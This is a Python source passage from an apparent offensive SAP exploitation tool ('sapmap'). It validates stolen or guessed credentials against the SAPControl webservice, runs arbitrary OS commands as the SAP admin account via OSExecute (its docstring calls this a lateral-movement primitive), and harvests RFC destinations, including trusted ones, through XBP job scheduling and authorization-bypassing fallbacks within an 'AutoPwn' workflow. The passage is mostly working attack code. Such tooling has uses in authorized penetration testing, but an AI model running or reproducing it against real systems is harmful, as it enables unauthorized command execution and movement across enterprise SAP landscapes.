        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        if is_https:
            import ssl as _ssl
            ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            try:
                ctx.minimum_version = _ssl.TLSVersion.TLSv1
            except (AttributeError, ValueError):
                pass
            s = ctx.wrap_socket(s, server_hostname=host)
        s.sendall(hdr + body_bytes)
        resp = b""
        try:
            while len(resp) < 65536:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except _sock.timeout:
            pass
        try:
            s.close()
        except Exception:
            pass
    except Exception as e:
        out["error"] = f"{type(e).__name__}: {e}"
        return out

    import re as _re
    m_status = _re.search(rb"HTTP/\S+\s+(\d{3})", resp)
    if m_status:
        out["status"] = int(m_status.group(1))
    out["response_body"] = resp[-2048:].decode("iso-8859-1",
                                                 errors="replace")
    if out["status"] == 401:
        out["error"] = "HTTP 401 — credentials rejected"
        return out
    if out["status"] not in (200, 204):
        out["error"] = f"HTTP {out['status'] or '<no status>'}"
        return out
    # Auth accepted.  GetInstanceProperties returns a repeating
    # <item><property>NAME</property><propertytype>...</propertytype>
    # <value>VAL</value></item> shape.  Pull each item, split into
    # (property → value), then look up the ones we care about.
    # Namespaces vary across kernels — strip prefixes.
    props = {}
    for item in _re.findall(
            rb'<item>(.*?)</item>', resp, _re.DOTALL):
        m_p = _re.search(
            rb'<(?:[A-Za-z0-9_]+:)?property[^>]*>'
            rb'([^<]*)</(?:[A-Za-z0-9_]+:)?property>',
            item, _re.I)
        m_v = _re.search(
            rb'<(?:[A-Za-z0-9_]+:)?value[^>]*>'
            rb'([^<]*)</(?:[A-Za-z0-9_]+:)?value>',
            item, _re.I)
        if m_p and m_v:
            k = m_p.group(1).decode("iso-8859-1",
                                     "replace").strip().upper()
            v = m_v.group(1).decode("iso-8859-1",
                                     "replace").strip()
            if k:
                props[k] = v
    out["sid"] = (props.get("SAPSYSTEMNAME") or "").strip()
    inst = (props.get("SAPSYSTEM") or "").strip()
    if inst.isdigit():
        out["instance_nr"] = inst.zfill(2)
    else:
        out["instance_nr"] = inst
    out["hostname"] = (props.get("SAPLOCALHOST")
                        or props.get("INSTANCE_NAME") or "").strip()

    # Stack detection from INSTANCE_NAME.  SAP kernel names the
    # instance folder by role:
    #   D<NN>   → ABAP dialog       (ABAP)
    #   J<NN>   → Java central      (JAVA)
    #   JC<NN>  → Java Central w/ SCS
    #   JD<NN>  → Java dialog
    #   SCS<NN> → Standalone Central Services (Java-side)
    #   ASCS<NN>→ ABAP Central Services
    #   HDB<NN> → HANA
    # Used by the caller to backfill node.system_type on placeholder
    # targets that had it empty — the frontend's isJavaStack /
    # isAbapStack gates read from system_type, so without this the
    # Java-only menu items stay hidden even after we've proven
    # OSExecute against the target.
    _inst_name = (props.get("INSTANCE_NAME") or "").strip().upper()
    out["stack_hint"] = ""
    if _inst_name.startswith(("JC", "JD", "J")):
        out["stack_hint"] = "JAVA"
    elif _inst_name.startswith("SCS"):
        out["stack_hint"] = "JAVA"   # SCS is Java-side CS
    elif _inst_name.startswith("D"):
        out["stack_hint"] = "ABAP"
    elif _inst_name.startswith("ASCS"):
        out["stack_hint"] = "ABAP"
    elif _inst_name.startswith("HDB"):
        out["stack_hint"] = "HANA"

    # Stage 2 — AccessCheck for OSExecute.  This is what actually
    # validates the credential AND authorization for the operation
    # we care about.  Returns:
    #   out["osexec_access"] = 1  → credential + authz OK, OSExecute
    #                                is unlocked
    #   out["osexec_access"] = 0  → credential OK but authz denied
    #                                (rare — <sid>adm nearly always
    #                                has S_ADMI_FCD-equiv)
    #   out["osexec_access"] = -1 → credential rejected (HTTP 401 or
    #                                500 Invalid Credentials)
    # The caller inspects this and only sets os_exec_verified when
    # osexec_access == 1.
    out["osexec_access"] = -1
    ac_body = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<SOAP-ENV:Envelope xmlns:SOAP-ENV='
        '"http://schemas.xmlsoap.org/soap/envelope/">'
        '<SOAP-ENV:Body>'
        '<ns1:AccessCheck xmlns:ns1="urn:SAPControl">'
        '<function>OSExecute</function>'
        '</ns1:AccessCheck>'
        '</SOAP-ENV:Body></SOAP-ENV:Envelope>'
    )
    ac_body_bytes = ac_body.encode("utf-8")
    ac_hdr = (
        f"POST {path} HTTP/1.0\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: text/xml; charset=utf-8\r\n"
        f"Content-Length: {len(ac_body_bytes)}\r\n"
        f"SOAPAction: \"\"\r\n"
        f"Authorization: Basic {auth}\r\n"
        f"User-Agent: sapmap-sapcontrol-probe/1.0\r\n"
        f"Connection: close\r\n\r\n"
    ).encode("iso-8859-1")

    ac_resp = b""
    try:
        s2 = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        s2.settimeout(timeout)
        s2.connect((host, port))
        if is_https:
            import ssl as _ssl
            ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            try:
                ctx.minimum_version = _ssl.TLSVersion.TLSv1
            except (AttributeError, ValueError):
                pass
            s2 = ctx.wrap_socket(s2, server_hostname=host)
        s2.sendall(ac_hdr + ac_body_bytes)
        try:
            while len(ac_resp) < 65536:
                chunk = s2.recv(4096)
                if not chunk:
                    break
                ac_resp += chunk
        except _sock.timeout:
            pass
        try:
            s2.close()
        except Exception:
            pass
    except Exception as e:
        out["ok"] = True   # stage 1 already succeeded
        out["access_check_error"] = f"{type(e).__name__}: {e}"
        return out

    m_ac_status = _re.search(rb"HTTP/\S+\s+(\d{3})", ac_resp)
    ac_status = int(m_ac_status.group(1)) if m_ac_status else 0
    out["access_check_status"] = ac_status

    if ac_status == 401:
        out["ok"] = True
        out["access_check_error"] = "HTTP 401 — credential rejected"
        return out
    if ac_status not in (200, 204):
        # HTTP 500 with body "Invalid Credentials" is what OSExecute
        # returns when the password is wrong.  Mirror the same
        # detection for the AccessCheck path — some kernels return
        # the same error for AccessCheck too.
        body_low = ac_resp.lower()
        if b"invalid credential" in body_low:
            out["ok"] = True
            out["access_check_error"] = (
                f"HTTP {ac_status} — credential rejected")
            return out
        # AccessCheck may not be implemented on very old kernels —
        # not fatal.  Leave osexec_access=-1 so the caller doesn't
        # blindly set os_exec_verified, and surface the error.
        m_fault = _re.search(
            rb"<faultstring[^>]*>([^<]*)</faultstring>", ac_resp)
        fault = (m_fault.group(1).decode("iso-8859-1", "replace")
                  .strip() if m_fault else "")
        out["ok"] = True
        out["access_check_error"] = (
            f"HTTP {ac_status}"
            + (f" — {fault}" if fault else ""))
        return out

    # 200 OK — parse <access>N</access>.  Accept both plain and
    # namespaced tags.  On some kernels the field is named
    # <status> instead, with 0 for allowed, 1 for denied.  Handle
    # the ambiguity by looking for both and preferring the specific
    # "access denied" text if present.
    m_access = _re.search(
        rb"<(?:[A-Za-z0-9_]+:)?access[^>]*>(-?\d+)</",
        ac_resp, _re.I)
    ac_body_low = ac_resp.lower()
    if m_access:
        try:
            out["osexec_access"] = int(m_access.group(1))
        except ValueError:
            pass
    elif b"access denied" in ac_body_low:
        out["osexec_access"] = 0
    else:
        # Ambiguous 200 with no <access> tag.  Optimistically treat
        # as allowed — the kernel accepted the credentials (that's
        # what a 200 means for an authenticated method) and didn't
        # reject the AccessCheck.  If OSExecute later fails we'll
        # surface that error to the operator directly.
        out["osexec_access"] = 1
        out["access_check_note"] = (
            "AccessCheck returned 200 with no <access> tag — "
            "treating as allowed")

    # Stage 3 — target OS detection.  Only fires when AccessCheck
    # confirmed OSExecute is authorized; we don't want to burn a
    # probe on an unusable credential.  Runs one call with the
    # ABSOLUTE Linux path /bin/uname:
    #   * Linux → succeeds (uname is at /bin on every distro that
    #             ships /bin as a real directory or symlink),
    #             returns "Linux" / "SunOS" / "AIX" / "Darwin" /
    #             "HP-UX".  sapstartsrv's restricted PATH doesn't
    #             matter because the binary is addressed absolutely.
    #   * Windows → CreateProcess("/bin/uname", []) has no chance
    #             (Windows doesn't understand the path), and the
    #             kernel reports "CreateProcess failed" in the
    #             HTTP 500 body.  That literal marker gives us a
    #             positive Windows signal.
    # When neither signal is definitive (network fault, response
    # doesn't fit either pattern), leave hint empty so the wrap
    # layer falls back to node.os_type / user-pattern heuristics.
    out["os_hint"] = ""
    out["os_name"] = ""   # raw uname output when Unix — e.g. "Linux"
    if out.get("osexec_access") == 1:
        try:
            os_probe = sapcontrol_os_execute(
                url, user, password, "/bin/uname", timeout=8.0)
            probe_out = (os_probe.get("output") or "").strip()
            probe_err = (os_probe.get("error") or "").lower()
            _unix_markers = ("linux", "sunos", "aix", "darwin",
                              "hp-ux", "freebsd", "openbsd", "netbsd")
            if (os_probe.get("ok")
                    and os_probe.get("exit_code") == 0
                    and any(m in probe_out.lower()
                            for m in _unix_markers)):
                out["os_hint"] = "unix"
                # Take the first non-empty line of uname output —
                # that's the raw OS name Sapmap can display in
                # System Details ("Linux", "Darwin", "AIX", ...).
                for _ln in probe_out.splitlines():
                    _ln = _ln.strip()
                    if _ln:
                        out["os_name"] = _ln
                        break
            elif ("createprocess" in probe_err
                    or "createprocess" in (
                        os_probe.get("output") or "").lower()):
                out["os_hint"] = "windows"
                out["os_name"] = "Windows NT"
            # Anything else — leave hint empty; wrap layer falls
            # back to node.os_type / user-pattern heuristics.
        except Exception:
            pass

    out["ok"] = True
    return out


def sapcontrol_os_execute(url: str, user: str, password: str,
                             command: str, timeout: float = 30.0) -> dict:
    """Run an OS command through SAPControl <OSExecute/>.

    The SAPControl webservice on 5NN13/5NN14 exposes OSExecute as an
    authenticated SOAP method: given a shell command string, the
    SAP kernel forks a child process running as <sid>adm (the
    account that owns the SAP install) and returns stdout / stderr
    interleaved plus the exit code.  This is the primary
    lateral-movement primitive once we've verified the credential
    with sapcontrol_auth_probe.

    Returns:
      { ok, status, error, exit_code, output, pid }
    """
    import socket as _sock
    import base64 as _b64
    from urllib.parse import urlparse
    from xml.sax.saxutils import escape as _xml_escape
    out = {"ok": False, "status": 0, "error": "",
            "exit_code": -1, "output": "", "pid": 0}
    if not url:
        out["error"] = "empty URL"
        return out
    if not command:
        out["error"] = "empty command"
        return out
    try:
        parts = urlparse(url)
    except Exception as e:
        out["error"] = f"invalid URL: {e}"
        return out
    host = parts.hostname or ""
    if not host:
        out["error"] = "no hostname in URL"
        return out
    scheme = (parts.scheme or "http").lower()
    is_https = scheme == "https"
    port = parts.port or (443 if is_https else 80)
    path = parts.path or "/SAPControl.CGI"

    # OSExecute takes: command, async, timeout, protocol (SAPControl_1
    # or SAPControl_2).  async=0 blocks until the child exits and
    # returns the captured stdout.  timeout is in seconds.  protocol
    # SAPControl_2 is available on kernel 720+ and returns the
    # exit code — 1 doesn't.  Default to _2 and fall back on fault.
    cmd_esc = _xml_escape(command, {'"': "&quot;", "'": "&apos;"})
    body = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<SOAP-ENV:Envelope xmlns:SOAP-ENV='
        '"http://schemas.xmlsoap.org/soap/envelope/">'
        '<SOAP-ENV:Body>'
        '<ns1:OSExecute xmlns:ns1="urn:SAPControl">'
        f'<command>{cmd_esc}</command>'
        '<async>0</async>'
        f'<timeout>{int(timeout)}</timeout>'
        '<protocol>SAPControl_2</protocol>'
        '</ns1:OSExecute>'
        '</SOAP-ENV:Body></SOAP-ENV:Envelope>'
    )
    body_bytes = body.encode("utf-8")
    auth = _b64.b64encode(
        f"{user}:{password}".encode("utf-8")).decode("ascii")
    hdr = (
        f"POST {path} HTTP/1.0\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: text/xml; charset=utf-8\r\n"
        f"Content-Length: {len(body_bytes)}\r\n"
        f"SOAPAction: \"\"\r\n"
        f"Authorization: Basic {auth}\r\n"
        f"User-Agent: sapmap-osexecute/1.0\r\n"
        f"Connection: close\r\n\r\n"
    ).encode("iso-8859-1")

    try:
        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        s.settimeout(timeout + 15.0)  # give kernel some slack
        s.connect((host, port))
        if is_https:
            import ssl as _ssl
            ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            try:
                ctx.minimum_version = _ssl.TLSVersion.TLSv1
            except (AttributeError, ValueError):
                pass
            s = ctx.wrap_socket(s, server_hostname=host)
        s.sendall(hdr + body_bytes)
        resp = b""
        try:
            while len(resp) < 1_048_576:  # 1 MiB — enough for `ls -laR /`
                chunk = s.recv(65536)
                if not chunk:
                    break
                resp += chunk
        except _sock.timeout:
            pass
        try:
            s.close()
        except Exception:
            pass
    except Exception as e:
        out["error"] = f"{type(e).__name__}: {e}"
        return out

    import re as _re
    m_status = _re.search(rb"HTTP/\S+\s+(\d{3})", resp)
    if m_status:
        out["status"] = int(m_status.group(1))
    if out["status"] == 401:
        out["error"] = "HTTP 401 — credential rejected"
        return out
    if out["status"] not in (200, 204):
        # Parse SOAP fault if present
        m_fault = _re.search(
            rb"<faultstring[^>]*>([^<]*)</faultstring>", resp)
        fault = (m_fault.group(1).decode("iso-8859-1", "replace")
                  .strip() if m_fault else "")
        out["error"] = (
            f"HTTP {out['status'] or '<no status>'}"
            + (f" — {fault}" if fault else ""))
        return out

    # Success — parse OSExecuteResponse.  Lines are in <lines><item>...</item>.
    lines = []
    for item in _re.findall(rb"<item>([^<]*)</item>", resp):
        # SOAP encoding leaves &lt; &gt; etc.; decode.
        s_ln = item.decode("iso-8859-1", "replace")
        s_ln = (s_ln.replace("&lt;", "<").replace("&gt;", ">")
                    .replace("&amp;", "&").replace("&quot;", '"')
                    .replace("&apos;", "'"))
        lines.append(s_ln)
    out["output"] = "\n".join(lines)
    # <exitcode> (SAPControl_2) or fall through with -1
    m_exit = _re.search(rb"<exitcode>(-?\d+)</exitcode>", resp)
    if m_exit:
        try:
            out["exit_code"] = int(m_exit.group(1))
        except ValueError:
            pass
    m_pid = _re.search(rb"<pid>(\d+)</pid>", resp)
    if m_pid:
        try:
            out["pid"] = int(m_pid.group(1))
        except ValueError:
            pass
    out["ok"] = True
    return out


def http_basic_auth_probe(url: str, user: str, password: str,
                             timeout: float = 8.0) -> dict:
    """Generic HTTP basic-auth probe for Type-G destinations.

    Sends GET <url> with Authorization: Basic base64(user:password)
    and interprets the response:
      * 200 / 302 / 303 → credential accepted, target serves content
      * 403             → credential accepted, ACL denies content
      * 401             → credential rejected
      * anything else   → target answered (ping_ok=True) but auth
                            outcome is inconclusive
    Used when the target isn't a SAPControl endpoint AND isn't an
    ABAP RFC surface — most commonly a Java ICM (port 5NN00 /
    5NN01), a BTP tenant, or a third-party HTTP API.  RFC_PING would
    fault on those with an XML parse error because the response
    isn't a SOAP envelope.

    Returns:
      { ok, status, error, logon_successful, response_body }
    """
    import socket as _sock
    import base64 as _b64
    from urllib.parse import urlparse
    out = {"ok": False, "status": 0, "error": "",
            "logon_successful": False, "response_body": ""}
    if not url:
        out["error"] = "empty URL"
        return out
    try:
        parts = urlparse(url)
    except Exception as e:
        out["error"] = f"invalid URL: {e}"
        return out
    host = parts.hostname or ""
    if not host:
        out["error"] = "no hostname in URL"
        return out
    scheme = (parts.scheme or "http").lower()
    is_https = scheme == "https"
    port = parts.port or (443 if is_https else 80)
    path = parts.path or "/"
    if parts.query:
        path = f"{path}?{parts.query}"

    auth = _b64.b64encode(
        f"{user}:{password}".encode("utf-8")).decode("ascii")
    req = (
        f"GET {path} HTTP/1.0\r\n"
        f"Host: {host}:{port}\r\n"
        f"Authorization: Basic {auth}\r\n"
        f"User-Agent: sapmap-basicauth-probe/1.0\r\n"
        f"Connection: close\r\n\r\n"
    ).encode("iso-8859-1")

    try:
        s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        if is_https:
            import ssl as _ssl
            ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            try:
                ctx.minimum_version = _ssl.TLSVersion.TLSv1
            except (AttributeError, ValueError):
                pass
            s = ctx.wrap_socket(s, server_hostname=host)
        s.sendall(req)
        resp = b""
        try:
            while len(resp) < 32768:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except _sock.timeout:
            pass
        try:
            s.close()
        except Exception:
            pass
    except Exception as e:
        out["error"] = f"{type(e).__name__}: {e}"
        return out

    import re as _re
    m_status = _re.search(rb"HTTP/\S+\s+(\d{3})", resp)
    if m_status:
        out["status"] = int(m_status.group(1))
    out["response_body"] = resp[-2048:].decode("iso-8859-1",
                                                 errors="replace")
    if out["status"] == 0:
        out["error"] = "no HTTP response"
        return out
    if out["status"] == 401:
        out["ok"] = True   # target answered
        out["logon_successful"] = False
        out["error"] = "HTTP 401 — credentials rejected"
        return out
    if out["status"] in (200, 302, 303, 403):
        out["ok"] = True
        out["logon_successful"] = True
        return out
    # Anything else: target answered but auth outcome unclear.
    out["ok"] = True
    out["logon_successful"] = False
    out["error"] = f"HTTP {out['status']} — auth outcome inconclusive"
    return out


def _ping_via_iwb_check(node, destination_name, creds=None):
    """Fallback ping via IWB_SHE_RFCDESTINATION_CHECK (available on older kernels)."""
    result = {"ping_ok": False, "remote_sid": "", "remote_hostname": "",
              "remote_ip": "", "error": "", "ping_message": "", "logon_ok": False}
    with _get_connection(node, creds) as conn:
        try:
            r, iwb_timeout = _run_with_timeout(
                conn.call, 20.0,
                "IWB_SHE_RFCDESTINATION_CHECK",
                RFCDESTINATION=destination_name)
            if iwb_timeout:
                _detach_if_timed_out(conn, True)
                result["error"] = (f"IWB_SHE_RFCDESTINATION_CHECK "
                                    f"timeout after 20s")
                return result
            subrc = r.get("RFC_SUBRC", 99)
            try:
                subrc = int(subrc)
            except (ValueError, TypeError):
                subrc = 99
            sysid = r.get("RFC_SYSID", "").strip()
            user = r.get("RFC_USER", "").strip()
            msg = (r.get("MSGV1", "") + r.get("MSGV2", "")).strip()
            if subrc == 0:
                result["ping_ok"] = True
                result["logon_ok"] = True
                result["remote_sid"] = sysid
                result["ping_message"] = "IWB check OK"
                result["error"] = ""
                logger.info(f"IWB_SHE_RFCDESTINATION_CHECK {destination_name}: "
                            f"OK (SID={sysid}, user={user})")
            else:
                result["error"] = msg or f"IWB check subrc={subrc}"
        except Exception as e:
            result["error"] = format_rfc_exception(e).split("\n")[0]
    return result


def _ping_via_direct_connect(node, destination_name, creds=None):
    """Fallback ping: read RFCDES options, parse H=host/S=instance, try TCP connect."""
    import socket as _sock
    result = {"ping_ok": False, "remote_sid": "", "remote_hostname": "",
              "remote_ip": "", "error": "", "ping_message": ""}

    with _get_connection(node, creds) as conn:
        rows = conn.call("RFC_READ_TABLE", QUERY_TABLE="RFCDES", DELIMITER="|",
                         FIELDS=[{"FIELDNAME": "RFCDEST"}, {"FIELDNAME": "RFCOPTIONS"}],
                         OPTIONS=[{"TEXT": f"RFCDEST = '{destination_name}'"}])
        for row in rows.get("DATA", []):
            wa = row.get("WA", "")
            parts = wa.split("|")
            if len(parts) < 2:
                continue
            opts = parts[1].strip()
            # Parse H=host, S=instance, M=client, U=user from comma-separated options
            opt_map = {}
            for token in opts.split(","):
                token = token.strip()
                if "=" in token:
                    k, v = token.split("=", 1)
                    opt_map[k.strip()] = v.strip()

            host = opt_map.get("H", "")
            inst = opt_map.get("S", "00")
            client = opt_map.get("M", "")
            user = opt_map.get("U", "")

            if not host:
                continue

            # Try TCP connect to gateway port (33XX)
            gw_port = 3300 + int(inst)
            try:
                s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                s.settimeout(5)
                s.connect((host, gw_port))
                s.close()
                result["ping_ok"] = True
                result["remote_ip"] = host
                result["remote_hostname"] = host
                result["ping_message"] = f"TCP connect to {host}:{gw_port} OK"
                result["error"] = ""
                logger.info(f"Direct connect to {destination_name} "
                            f"({host}:{gw_port}) succeeded")
            except Exception as e:
                result["error"] = f"TCP connect to {host}:{gw_port} failed: {format_rfc_exception(e)}"

            # Try RFC_SYSTEM_INFO via direct connection to get SID
            if result["ping_ok"]:
                try:
                    with RFCConnection(
                        sdk_path=conn._sdk_path,
                        ashost=host, sysnr=inst,
                        client=client or "000",
                        user=user or "SAPINFO",
                        passwd="",
                    ) as direct:
                        info = direct.call("RFC_SYSTEM_INFO")
                        export = info.get("RFCSI_EXPORT", {})
                        result["remote_sid"] = export.get("RFCSYSID", "").strip()
                        result["remote_hostname"] = export.get("RFCHOST", "").strip()
                        result["logon_ok"] = True
                except Exception:
                    pass  # TCP worked but RFC logon failed — still report ping_ok
            break
    return result


def get_remote_sysinfo(node: SAPNode, destination_name: str,
                       creds: Credentials = None) -> dict:
    """Get remote system info via RFC_GET_SYSTEM_INFO with DESTINATION.

    Calls RFC_GET_SYSTEM_INFO on the source system with DESTINATION
    parameter to retrieve the remote system's SID, hostname, etc.
    Output is in RFCSI_EXPORT field RFCSYSID.

    Returns dict with: sid, hostname, ip, error
    """
    result = {"sid": "", "hostname": "", "ip": "", "error": ""}

    try:
        with _get_connection(node, creds) as conn:
            info = conn.call(
                "RFC_GET_SYSTEM_INFO",
                DESTINATION=destination_name,
            )
            export = info.get("RFCSI_EXPORT", {})
            if isinstance(export, dict):
                result["sid"] = (export.get("RFCSYSID", "") or "").strip()
                result["hostname"] = (export.get("RFCHOST", "") or "").strip()
    except Exception as e:
        result["error"] = format_rfc_exception(e)

    return result


# ---------------------------------------------------------------------------
# Retrieve RFC connections (via RSRFCCHK)
# ---------------------------------------------------------------------------

def retrieve_rfc_connections(node: SAPNode, creds: Credentials = None) -> list:
    """Retrieve Type-3 RFC connections from a system by executing RSRFCCHK.

    Uses the XBP job scheduling approach from poc_remote_abap_exec.py.
    Returns list of RFCConn objects.

    Skips the XBP + RSRFCCHK path when a prior invocation flagged the
    node with ``_rsrfcchk_useless`` — either the job never finished
    within the poll window, or it finished with no rows.  In an
    AutoPwn multi-wave run, the same node otherwise re-runs the
    same 2-minute poll every wave for zero yield.  Operator-reported:
    SB6/AED wasted 6+ min across three waves before this cache.
    """
    connections = []

    if getattr(node, "_rsrfcchk_useless", False):
        print(f"[*] {node.sid}: RSRFCCHK previously produced no rows — "
              f"skipping XBP job, going straight to RFCDES fallback")
        try:
            with _get_connection(node, creds) as conn:
                return _try_rfc_read_table_fallback(conn, node)
        except Exception as e:
            logger.debug(f"RFCDES fallback (rsrfcchk-cached-useless) "
                          f"failed for {node.sid}: {format_rfc_exception(e)}")
            return []

    try:
        with _get_connection(node, creds) as conn:
            # Step 1: XMI Logon
            print(f"[*] Logging on to XBP interface on {node.sid}...")
            xmi_result = conn.call(
                "BAPI_XMI_LOGON",
                EXTCOMPANY="SAPMAP",
                EXTPRODUCT="SAPMAP",
                INTERFACE="XBP",
                VERSION="3.0",
            )
            ret = xmi_result.get("RETURN", {})
            if isinstance(ret, dict) and ret.get("TYPE", "") in ("E", "A"):
                print(f"[-] {node.sid}: XBP logon failed: {ret.get('MESSAGE', '')}")
                try:
                    node._rsrfcchk_useless = True
                except Exception:
                    pass
                return _try_rfc_read_table_fallback(conn, node)

            # Step 2: Open job
            print(f"[*] Scheduling RSRFCCHK job on {node.sid}...")
            job_result = conn.call(
                "BAPI_XBP_JOB_OPEN",
                JOBNAME=RSRFCCHK_JOB_NAME,
                EXTERNAL_USER_NAME=RSRFCCHK_EXTERNAL_USER,
            )
            jobcount = job_result.get("JOBCOUNT", "")
            if not jobcount:
                print(f"[-] {node.sid}: Failed to open job: {job_result}")
                return _try_rfc_read_table_fallback(conn, node)

            # Step 3: Add ABAP step
            conn.call(
                "BAPI_XBP_JOB_ADD_ABAP_STEP",
                JOBNAME=RSRFCCHK_JOB_NAME,
                JOBCOUNT=jobcount,
                EXTERNAL_USER_NAME=RSRFCCHK_EXTERNAL_USER,
                ABAP_PROGRAM_NAME=RSRFCCHK_PROGRAM,
            )

            # Step 4: Close job
            conn.call(
                "BAPI_XBP_JOB_CLOSE",
                JOBNAME=RSRFCCHK_JOB_NAME,
                JOBCOUNT=jobcount,
                EXTERNAL_USER_NAME=RSRFCCHK_EXTERNAL_USER,
            )

            # Step 5: Start job
            conn.call(
                "BAPI_XBP_JOB_START_IMMEDIATELY",
                JOBNAME=RSRFCCHK_JOB_NAME,
                JOBCOUNT=jobcount,
                EXTERNAL_USER_NAME=RSRFCCHK_EXTERNAL_USER,
            )
            print(f"[*] {node.sid}: Job started, polling for completion...")

            # Step 6: Wait for completion
            finished = False
            for attempt in range(DEFAULT_MAX_POLL_ATTEMPTS):
                status_result = conn.call(
                    "BAPI_XBP_JOB_STATUS_GET",
                    JOBNAME=RSRFCCHK_JOB_NAME,
                    JOBCOUNT=jobcount,
                    EXTERNAL_USER_NAME=RSRFCCHK_EXTERNAL_USER,
                )
                status = status_result.get("STATUS", "?")
                if status == "F":
                    finished = True
                    break
                if status == "X":
                    print(f"[-] {node.sid}: Job aborted")
                    break
                time.sleep(DEFAULT_POLL_INTERVAL)

            if not finished:
                print(f"[-] {node.sid}: Job did not finish, trying table fallback...")
                try:
                    node._rsrfcchk_useless = True
                except Exception:
                    pass
                return _try_rfc_read_table_fallback(conn, node)

            # Step 7: Read spool output
            print(f"[+] {node.sid}: Job finished, reading spool output...")
            try:
                spool_result = conn.call(
                    "BAPI_XBP_JOB_SPOOLLIST_READ",
                    JOBNAME=RSRFCCHK_JOB_NAME,
                    JOBCOUNT=jobcount,
                    STEP_NUMBER=1,
                    EXTERNAL_USER_NAME=RSRFCCHK_EXTERNAL_USER,
                )
                spool_lines = spool_result.get("SPOOL_LIST", [])
                if spool_lines:
                    connections = _parse_rsrfcchk_output(spool_lines, node)
                    # Validate: if destination names look like instance numbers
                    # (pure digits ≤2 chars), the spool format wasn't parsed correctly
                    if connections and all(
                        c.destination_name.isdigit() and len(c.destination_name) <= 2
                        for c in connections
                    ):
                        print(f"[*] {node.sid}: Spool format mismatch (kernel {node.kernel or '?'}), "
                              f"using RFCDES table instead...")
                        connections = _try_rfc_read_table_fallback(conn, node)
                    else:
                        print(f"[+] {node.sid}: Parsed {len(connections)} RFC connections from spool")
                else:
                    print(f"[*] {node.sid}: No spool output, trying table fallback...")
                    connections = _try_rfc_read_table_fallback(conn, node)
            except Exception as e:
                logger.debug(f"Spool read error: {format_rfc_exception(e)}")
                connections = _try_rfc_read_table_fallback(conn, node)

            # XMI Logoff
            try:
                conn.call("BAPI_XMI_LOGOFF", INTERFACE="XBP")
            except Exception:
                pass

            # If RSRFCCHK yielded nothing, fall back to RFCDES table
            if not connections:
                print(f"[*] {node.sid}: No connections from RSRFCCHK, trying RFCDES fallback...")
                try:
                    node._rsrfcchk_useless = True
                except Exception:
                    pass
                connections = _try_rfc_read_table_fallback(conn, node)

    except Exception as e:
        logger.error(f"RFC connection retrieval failed for {node.sid}: {format_rfc_exception(e)}")
        print(f"[-] {node.sid}: Failed to retrieve RFC connections: {format_rfc_exception(e)}")
        # Last resort: try RFCDES in a fresh connection
        try:
            with _get_connection(node, creds) as conn:
                connections = _try_rfc_read_table_fallback(conn, node)
        except Exception as e2:
            logger.debug(f"RFCDES fallback also failed: {format_rfc_exception(e2)}")

    # 3rd fallback: bypass RFC_GET_FUNCTION_INTERFACE using call_raw
    if not connections:
        try:
            with _get_connection(node, creds) as conn:
                connections = _try_rfcdes_raw_fallback(conn, node)
        except Exception as e3:
            logger.debug(f"call_raw RFCDES fallback also failed: {format_rfc_exception(e3)}")

    # 4th fallback: GET_TABLEBLOCK_COMPRESSED_RFC (bypasses both
    # RFC_GET_FUNCTION_INTERFACE and RFC_READ_TABLE authorization)
    if not connections:
        try:
            with _get_connection(node, creds) as conn:
                connections = _try_tableblock_compressed_fallback(conn, node)
        except Exception as e4:
            logger.debug(f"GET_TABLEBLOCK_COMPRESSED_RFC fallback failed: {format_rfc_exception(e4)}")

    # Supplement: RSRFCCHK only reports destinations with stored
    # passwords.  Trusted RFC destinations (no stored password, Type-3)
    # are invisible to it.  Always read RFCDES separately for those.
    connections = _supplement_trusted_destinations(
        connections, node, creds)

    return connections


# ---------------------------------------------------------------------------
# Supplement: discover trusted RFC destinations missed by RSRFCCHK
# ---------------------------------------------------------------------------

def _supplement_trusted_destinations(
        existing: list, node: SAPNode, creds: Credentials = None) -> list:
    """Read RFCDES for Type-3 destinations WITHOUT stored passwords.

    RSRFCCHK (the primary retrieval path) only reports destinations
    with stored credentials.  Trusted RFC destinations use assertion
    tickets and have no stored password, so RSRFCCHK misses them.
    This function reads RFCDES specifically for those and merges them
    into the existing list.
    """
    known_dests = {c.destination_name for c in existing}
    trusted_conns = []

    try:
        with _get_connection(node, creds) as conn:
            result = conn.call(
                RFC_READ_TABLE,
                QUERY_TABLE="RFCDES",
                DELIMITER="|",
                FIELDS=[
                    {"FIELDNAME": "RFCDEST"},
                    {"FIELDNAME": "RFCTYPE"},
                    {"FIELDNAME": "RFCOPTIONS"},
                ],
                OPTIONS=[{"TEXT": "RFCTYPE = '3'"}],
                ROWCOUNT=500,
            )

            data = result.get("DATA", [])
            for row in data:
                wa = row.get("WA", "")
                parts = wa.split("|")
                if len(parts) < 2:
                    continue
                dest_name = parts[0].strip()
                rfctype = parts[1].strip() if len(parts) > 1 else ""
                options = parts[2].strip() if len(parts) > 2 else ""

                if rfctype != "3":
                    continue
                if "%_PWD" in options:
                    continue
                # Trust marker: Q=Y in RFCOPTIONS (SM59 "Trust
                # Relationship = Yes").  Without it, this is just a
                # local / no-password destination, NOT a trusted RFC.
                if not _rfcdes_is_trusted(rfctype, options):
                    continue
                if dest_name in known_dests:
                    continue

